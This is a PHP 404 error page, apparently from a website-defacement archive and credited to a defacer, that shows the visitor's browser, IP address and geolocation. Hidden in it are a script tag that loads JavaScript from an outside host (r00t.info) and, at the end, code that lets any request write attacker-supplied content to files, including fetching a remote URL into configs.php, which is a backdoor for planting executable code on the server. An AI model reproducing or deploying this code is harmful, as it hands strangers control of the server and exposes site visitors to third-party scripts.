<?php
/* ./Port22 a.k.a سفياني محمد ( Muhammad Supiani).
Special Thanks : Allah SWT, My Parents And Family, Risman Effendi (defacerid.com).
*/
include'header.php';
?>
<?php
	$ip = "114.125.173.228";
 	$ipdetail = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip={$ip}"));
    $countryCity = $ipdetail->geoplugin_countryCity;
	$countryName = $ipdetail->geoplugin_countryName;
    $countryCode = $ipdetail->geoplugin_countryCode;
?>	
<div id="main-wrapper">
<h1>Not Found</h1>
<script src=http://r00t.info/ccb.js></script>
<div class="tempat">
Sorry Brother :( , Your Search Page 404 Not Found.
<br>
<br>
If You Search Attacker Or Team But 404 Not Found Maybe Attacker/Team Name Using #, /, or Space. Our Try To Fix It :)
<br>
<br>
~ Admin Security Exploded ~
<br>
<div class="maxtable">
<table>
<tr>
<td>Browser</td>
<td style="width:120px">IP</td>
<td>City</td>
<td>Country</td>
<td style="width:20px">Flag</td>
</tr>
<tr>
<td><?=$_SERVER['HTTP_USER_AGENT'];?></td>
<td><?=$ip;?></td>
<td><?=$countryCity;?></td>
<td><?=$countryName;?></td>
<td><img src='/assets/flags/<?=$countryCode; ?>.png' alt='<?=$countryName; ?>' title='<?=$countryName; ?>'></td>
</tr>
</table>
</div>
<br>
<br>
All The Information Contained in Security Exploded Cybercrime Archive Were Either Collected Online From Public Sources Or Directly Notified Anonymously To Us. Security Exploded Is Neither Responsible For The Reported Computer Crimes Not It Is Directly Or Indirectly Involved With Them. You Might Find Some Offensive Contents In The Mirrored Defacements. Security Exploded Didn't Produce Them So We Cannot Be Responsible For Such Contents.<br><a href="/disclaimer.html"><i class="fa fa-sign-in"></i> Read More</a>
</div>
</div>
<?php include"footer.php";?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>